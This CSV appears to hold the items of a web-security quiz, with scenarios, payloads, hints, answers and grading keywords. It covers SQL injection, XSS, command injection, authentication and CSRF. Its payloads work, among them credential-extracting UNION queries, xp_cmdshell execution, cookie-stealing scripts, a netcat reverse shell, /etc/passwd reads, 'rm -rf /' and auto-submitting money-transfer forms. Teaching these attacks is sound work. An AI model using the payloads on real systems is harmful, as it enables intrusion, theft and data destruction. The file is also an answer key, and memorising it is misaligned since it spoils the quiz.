id,category,difficulty,scenario,question,payload,hint,score_weight,type,answer,expected_solutions,interactive_demo,hide_payload
sql_1,SQL Injection,Beginner,Login form that checks username and password without proper input validation.,What would this payload do in a vulnerable system?,"' OR '1'='1' --",This makes the WHERE clause always true bypassing authentication.,10,sql_injection,This payload bypasses authentication by making the WHERE clause always evaluate to true.,"' OR '1'='1';authentication bypass;WHERE clause;always evaluate;always true",False,False
sql_2,SQL Injection,Intermediate,A search field where input is directly concatenated into SQL queries.,What would this payload attempt to do if successful?,"; DROP TABLE users; --",The semicolon separates multiple SQL statements allowing dangerous operations.,20,sql_injection,This payload attempts to drop the users table causing data loss.,DROP TABLE;data loss;multiple statements;semicolon,False,False
sql_3,SQL Injection,Advanced,Product search function that displays results from a database query.,How does this attack attempt to extract sensitive information?,"' UNION SELECT username, password FROM users --",UNION combines the results of two queries allowing access to other tables.,30,sql_injection,This payload uses UNION to combine results and extract user credentials.,UNION SELECT;data extraction;combine results;user credentials,False,False
sql_4,SQL Injection,Advanced,A login page that returns generic error messages but has different response times.,What type of SQL injection relies on response time delays?,admin' AND SLEEP(5) --,This attack asks the database to pause before responding confirming the injection.,35,sql_injection,Time-based Blind SQL Injection uses time delays to infer database information.,Time-based;Blind SQL;SLEEP;delay;response time,False,False
sql_5,SQL Injection,Expert,A system that only returns true/false responses without data.,How can you extract data when you only get yes/no responses?,"admin' AND SUBSTRING(password,1,1)='a' --",You have to guess the data one character at a time by asking true/false questions.,40,sql_injection,Boolean-based Blind SQL Injection extracts data by asking true/false questions.,Boolean-based;Blind SQL;SUBSTRING;true/false;yes/no,False,False
sql_6,SQL Injection,Intermediate,An e-commerce site search function that displays product names.,How can you determine the number of columns in a SELECT query?,' ORDER BY 5 --,Use ORDER BY with increasing numbers until you get an error.,25,sql_injection,This payload uses ORDER BY to determine column count by incrementing the number until an error occurs.,ORDER BY;column count;determine;enumerate;error,False,False
sql_7,SQL Injection,Advanced,A news portal that displays articles based on category ID.,How can you extract database version information?,"' UNION SELECT NULL,@@version,NULL --",@@version is a MySQL function that returns database version information.,35,sql_injection,This payload extracts the database version using @@version function via UNION injection.,@@version;database version;UNION;extract;information,False,False
sql_8,SQL Injection,Expert,A corporate intranet with user profiles.,How can you extract data from error messages?,' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users)) --,Error-based injection forces the database to display data in error messages.,45,sql_injection,Error-based SQL injection extracts data by forcing type conversion errors that reveal information.,error-based;CONVERT;type conversion;extract;error message,False,False
sql_9,SQL Injection,Expert,A secure login form with WAF (Web Application Firewall).,How can you bypass WAF filters using encoding?,admin'/**/OR/**/'1'='1'/**/--,Comments can bypass basic filters by breaking up keywords.,50,sql_injection,This payload uses inline comments to obfuscate SQL keywords and bypass WAF filters.,bypass;WAF;comment;obfuscate;filter evasion,False,False
sql_10,SQL Injection,Expert,A database backup tool with restricted access.,How can you achieve Remote Code Execution through SQL?,"'; EXEC xp_cmdshell('whoami'); --",Some databases allow executing system commands through stored procedures.,60,sql_injection,This payload uses xp_cmdshell to execute OS commands through SQL injection achieving RCE.,xp_cmdshell;RCE;remote code execution;system command;stored procedure,False,False
xss_1,Cross-Site Scripting (XSS),Beginner,A vulnerable comment form that doesn't sanitize user input.,What vulnerability would this payload exploit?,"<script>alert(""XSS"")</script>",Look at the HTML tags and think about what happens when they are rendered.,15,xss,This payload would execute JavaScript code showing an alert popup.,alert;javascript;script;execute;popup,True,False
xss_2,Cross-Site Scripting (XSS),Intermediate,A profile page that shows user input in HTML context.,How can you execute JavaScript without using script tags?,"<img src=""x"" onerror=""alert('XSS')"">",Think about HTML attributes that can execute JavaScript code.,25,xss,This payload uses the onerror event handler to execute JavaScript when the image fails to load.,onerror;img;event handler;image;attribute,True,False
xss_3,Cross-Site Scripting (XSS),Advanced,A search results page that reflects user input.,How can you bypass basic XSS filters?,"<svg onload=""alert(1)"">",SVG elements can have event handlers and some filters miss them.,35,xss,This payload uses an SVG element with an onload event handler to bypass basic script tag filters.,svg;onload;bypass;filter;event,True,False
xss_4,Cross-Site Scripting (XSS),Expert,A chat application that allows HTML input.,How can you perform a stored XSS attack?,"<iframe src=""javascript:alert(document.cookie)""></iframe>",Think about how to access sensitive information like cookies.,45,xss,This payload creates an iframe that executes JavaScript to access cookies demonstrating stored XSS.,iframe;javascript:;cookie;stored;persistent,True,False
xss_5,Cross-Site Scripting (XSS),Expert,A form that uses innerHTML to display user input.,How can you perform DOM-based XSS?,<img src=x onerror=alert(1)>,DOM-based XSS occurs when JavaScript modifies the DOM based on user input.,50,xss,This payload uses DOM-based XSS by manipulating the innerHTML property to execute JavaScript.,dom;innerHTML;javascript;manipulation;client-side,True,False
xss_6,Cross-Site Scripting (XSS),Expert,A page that reflects input inside a JavaScript variable.,How can you break out of a JavaScript string context?,'; alert(1); //,You need to close the string and the statement before injecting your code.,50,xss,This payload breaks out of the JavaScript string context to execute arbitrary code.,break out;string context;quote;semicolon;comment,True,False
xss_7,Cross-Site Scripting (XSS),Advanced,A markdown renderer that converts user input to HTML.,How can you exploit markdown parsers with XSS?,[Click me](javascript:alert(document.cookie)),Markdown link syntax can accept javascript: protocol handlers.,40,xss,This payload exploits markdown link syntax to execute JavaScript through the javascript: protocol.,markdown;javascript:;protocol;link;parser,True,False
xss_8,Cross-Site Scripting (XSS),Expert,A JSON API that reflects user data.,How can you perform XSS through JSON responses?,"{""name"":""<script>alert(1)</script>""}",If JSON responses are rendered as HTML without escaping XSS is possible.,45,xss,This payload exploits improper JSON rendering by injecting script tags in JSON data.,JSON;API;response;rendering;escape,True,False
xss_9,Cross-Site Scripting (XSS),Expert,A rich text editor with sanitization.,How can you bypass HTML sanitizers?,"<img src=x onerror=""&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"">",HTML entity encoding can bypass some sanitization filters.,50,xss,This payload uses HTML entity encoding to obfuscate JavaScript and bypass sanitizers.,HTML entity;encoding;bypass;sanitizer;obfuscate,True,False
xss_10,Cross-Site Scripting (XSS),Expert,A CSS injection vulnerability in style attributes.,How can you achieve XSS through CSS injection?,"style=""background:url('javascript:alert(1)')""",CSS url() function can accept javascript: protocol in some browsers.,55,xss,This payload exploits CSS url() function to execute JavaScript through style attributes.,CSS injection;url();style;javascript:;attribute,True,False
cmd_1,Command Injection,Beginner,A ping utility that takes user input for IP addresses.,What would this payload do in a vulnerable system?,127.0.0.1; ls,The semicolon separates commands in shell environments.,20,command_injection,This payload would ping localhost and then list directory contents.,ping;ls;semicolon;command;separator,True,False
cmd_2,Command Injection,Intermediate,A file upload system that processes filenames.,How can you execute multiple commands?,file.txt && whoami,Think about logical operators in shell commands.,30,command_injection,This payload uses && to execute whoami only if the first command succeeds.,&&;whoami;logical;operator;conditional,True,False
cmd_3,Command Injection,Advanced,A system monitoring tool that accepts hostnames.,How can you bypass command injection filters?,$(whoami),Command substitution can execute commands within other commands.,40,command_injection,This payload uses command substitution to execute whoami and insert the result.,$();substitution;bypass;filter;execute,True,False
cmd_4,Command Injection,Expert,A network diagnostic tool.,How can you perform a reverse shell attack?,nc -e /bin/sh 192.168.1.100 4444,Netcat can be used to create network connections and execute shells.,50,command_injection,This payload attempts to create a reverse shell connection to an attacker-controlled system.,netcat;reverse;shell;connection;nc,True,False
cmd_5,Command Injection,Advanced,A log viewer that accepts filenames.,How can you chain commands using pipes?,log.txt | whoami,The pipe operator passes the output of one command to another.,35,command_injection,This payload uses the pipe operator to pass the file content (or empty output) to the whoami command.,pipe;|;chain;output;redirect,True,False
cmd_6,Command Injection,Intermediate,A backup script that accepts directory paths.,How can you use backticks for command injection?,/var/www/`whoami`,Backticks execute commands and substitute their output.,30,command_injection,This payload uses backticks for command substitution executing whoami and inserting the result.,backticks;`;substitution;execute;output,True,False
cmd_7,Command Injection,Advanced,A web interface for managing services.,How can you bypass input validation filters?,service;cat${IFS}/etc/passwd,Use environment variables like $IFS to bypass space filters.,40,command_injection,This payload uses $IFS (Internal Field Separator) to bypass space-blocking filters.,$IFS;bypass;filter;environment variable;space,True,False
cmd_8,Command Injection,Advanced,A file conversion utility.,How can you use wildcard injection?,*.txt; rm -rf /,Wildcards expand to match filenames potentially executing unintended commands.,45,command_injection,This payload uses wildcard expansion followed by command chaining to execute destructive commands.,wildcard;*;expansion;rm;destructive,True,False
cmd_9,Command Injection,Expert,An image processing service.,How can you exploit ImageMagick command injection?,"convert 'image.png' -resize 100x100 '; ls; '",ImageMagick and similar tools may execute shell commands in certain contexts.,50,command_injection,This payload injects shell commands into ImageMagick processing exploiting command execution vulnerabilities.,ImageMagick;convert;shell;injection;processing,True,False
cmd_10,Command Injection,Expert,A code compilation service.,How can you perform time-based blind command injection?,"code.c; sleep 10 && echo ""done""",Use time delays to confirm command execution when there's no direct output.,55,command_injection,This payload uses sleep command for time-based blind injection to confirm vulnerability without visible output.,time-based;blind;sleep;delay;confirm,True,False
auth_1,Authentication Attacks,Beginner,A login form with weak password requirements.,What's the most common authentication vulnerability?,Weak Passwords,Think about password complexity requirements.,15,authentication,Weak passwords are the most common authentication vulnerability allowing brute force attacks.,weak;password;brute force;dictionary;common,False,True
auth_2,Authentication Attacks,Intermediate,A web application using HTTP instead of HTTPS.,Why is transmitting passwords over HTTP dangerous?,Credentials transmitted in plaintext,Network traffic can be intercepted and read.,25,authentication,HTTP transmits data in plaintext allowing attackers to intercept credentials through network sniffing.,plaintext;HTTP;intercept;sniffing;unencrypted,False,True
auth_3,Authentication Attacks,Advanced,A login system without rate limiting.,How can attackers exploit lack of rate limiting?,Brute Force Attack,"Without rate limiting, attackers can automate thousands of login attempts per minute using tools like Hydra or Burp Suite Intruder to guess passwords systematically.",35,authentication,Without rate limiting attackers can perform unlimited login attempts to guess passwords.,brute force;rate limiting;unlimited attempts;password guessing;throttling,False,True
auth_4,Authentication Attacks,Expert,A session management system using predictable session IDs.,What attack targets predictable session tokens?,Session Hijacking,Attackers can predict or steal valid session identifiers.,45,authentication,Predictable session IDs allow attackers to hijack user sessions by guessing valid tokens.,session hijacking;predictable;token;session ID;fixation,False,True
auth_5,Authentication Attacks,Intermediate,A password reset function that doesn't verify user identity.,What vulnerability exists in insecure password reset?,Account Takeover,Attackers can reset passwords without proper verification.,30,authentication,Insecure password reset allows attackers to take over accounts by bypassing identity verification.,account takeover;password reset;verification;identity;bypass,False,True
auth_6,Authentication Attacks,Beginner,A newly installed device administration panel.,What are the first credentials you should try?,Default Credentials,Manufacturers often ship devices with standard login details.,15,authentication,Default credentials are standard usernames and passwords set by manufacturers.,default;credentials;admin;password;factory,True,True
auth_7,Authentication Attacks,Advanced,A password reset mechanism using security questions.,How can you bypass security questions?,Social Engineering or Predictable Answers,"Search social media profiles, public records, or use OSINT tools to find answers to common security questions like 'mother's maiden name' or 'first pet'. Many answers are publicly available on Facebook, LinkedIn, or data breach databases.",40,authentication,Security questions can be bypassed through social engineering or by finding answers in public records.,social engineering;security questions;public records;guessable;predictable,True,True
auth_8,Authentication Attacks,Expert,A multi-factor authentication system.,How can you bypass 2FA/MFA?,Session hijacking or MFA fatigue attacks,Attackers can bypass MFA through session manipulation or by overwhelming users with authentication requests.,50,authentication,MFA can be bypassed through session hijacking SIM swapping or MFA fatigue (push notification spam).,2FA;MFA;bypass;session hijacking;fatigue attack,True,True
auth_9,Authentication Attacks,Expert,An OAuth2 implementation with redirect_uri vulnerability.,How can you exploit OAuth redirect vulnerabilities?,Manipulate redirect_uri to steal authorization codes,If redirect_uri validation is weak attackers can redirect tokens to malicious sites.,55,authentication,OAuth redirect vulnerabilities allow attackers to steal authorization codes by manipulating the redirect_uri parameter.,OAuth;redirect_uri;authorization code;token theft;validation,True,True
auth_10,Authentication Attacks,Expert,A biometric authentication system with liveness detection.,How can you bypass biometric authentication?,Presentation attacks using photos videos or 3D models,Biometric systems can be fooled by high-quality reproductions if liveness detection is weak.,60,authentication,Biometric authentication can be bypassed through presentation attacks using photos videos masks or fingerprint replicas.,biometric;presentation attack;liveness detection;spoof;bypass,True,True
csrf_1,CSRF Vulnerabilities,Beginner,A banking application without CSRF protection.,What attack can change user data without their knowledge?,Cross-Site Request Forgery,Think about requests that are made from other sites.,15,csrf,CSRF allows attackers to perform actions on behalf of authenticated users.,CSRF;Cross-Site Request Forgery;authenticated users;unauthorized actions,False,True
csrf_2,CSRF Vulnerabilities,Intermediate,A form that changes user settings.,How can you protect against CSRF attacks?,CSRF Tokens,Think about unique unpredictable values that verify request authenticity.,25,csrf,CSRF tokens are unique values that verify requests come from legitimate sources.,CSRF tokens;unique values;request authenticity;legitimate sources,False,True
csrf_3,CSRF Vulnerabilities,Advanced,An image tag that triggers a state change.,How can GET requests be exploited for CSRF?,"<img src=""http://bank.com/transfer?to=attacker&amount=1000"">",Browsers automatically load images which generates a GET request.,35,csrf,This payload uses an image tag to force the browser to make a GET request to a sensitive endpoint.,img;tag;GET request;automatic;load,False,True
csrf_4,CSRF Vulnerabilities,Intermediate,A form that uses POST but lacks CSRF protection.,How can you perform CSRF attacks on POST requests?,"<form action=""http://bank.com/transfer"" method=""POST""><input name=""to"" value=""attacker""/><input name=""amount"" value=""1000""/></form><script>document.forms[0].submit();</script>",Auto-submitting forms can trigger POST requests from malicious pages.,30,csrf,This payload creates an auto-submitting form that performs unauthorized POST requests.,POST;auto-submit;form;unauthorized;request,False,False
csrf_5,CSRF Vulnerabilities,Advanced,An API that accepts JSON but validates Content-Type.,How can you bypass Content-Type restrictions in CSRF?,Use form-encoded POST that gets parsed as JSON by backend,"Send a form with Content-Type: application/x-www-form-urlencoded, but structure the data like JSON. Many frameworks (Express.js, Flask) will parse both formats, letting you bypass the Content-Type check while still submitting valid JSON data.",40,csrf,CSRF can bypass Content-Type restrictions if the backend accepts multiple formats or has lenient parsing.,Content-Type;JSON;bypass;parsing;format,False,True
csrf_6,CSRF Vulnerabilities,Advanced,A SPA (Single Page Application) using cookies for authentication.,How does SameSite cookie attribute prevent CSRF?,SameSite=Strict or SameSite=Lax,SameSite attribute restricts when cookies are sent with cross-site requests.,35,csrf,SameSite cookie attribute prevents CSRF by restricting cookie transmission on cross-site requests.,SameSite;cookie attribute;cross-site;Strict;Lax,False,True
csrf_7,CSRF Vulnerabilities,Expert,A WebSocket connection without origin validation.,How can you perform CSRF attacks via WebSockets?,Establish WebSocket connection from malicious site,WebSockets can bypass CSRF protections if origin headers aren't validated.,45,csrf,WebSocket CSRF occurs when servers accept connections without validating the Origin header.,WebSocket;origin;validation;header;connection,False,True
csrf_8,CSRF Vulnerabilities,Expert,A file upload endpoint without CSRF tokens.,How can you exploit file upload via CSRF?,"<form action=""http://site.com/upload"" method=""POST"" enctype=""multipart/form-data""><input type=""file"" name=""file""/></form>","Create an auto-submitting HTML form with enctype=""multipart/form-data"" and a file input that submits to the upload endpoint. Host it on your site to exploit authenticated users.",50,csrf,CSRF file upload attacks allow attackers to upload malicious files on behalf of authenticated users.,"file upload;multipart;form-data;malicious;token",False,False
csrf_9,CSRF Vulnerabilities,Expert,A logout endpoint accessible via GET request.,How can you perform logout CSRF?,"<img src=""http://site.com/logout"">",Logout endpoints accessible via GET can be triggered by loading images.,35,csrf,Logout CSRF forces users to logout by triggering the logout endpoint via GET requests.,logout;GET;img tag;force;endpoint,False,False
csrf_10,CSRF Vulnerabilities,Expert,A modern application using custom headers for CSRF protection.,How effective are custom headers for CSRF prevention?,Custom headers like X-Requested-With prevent CSRF as they can't be set cross-origin,Custom headers require preflight CORS requests making cross-origin attacks harder.,45,csrf,Custom headers provide CSRF protection because browsers prevent cross-origin custom headers without CORS.,custom header;X-Requested-With;CORS;preflight;cross-origin,False,True
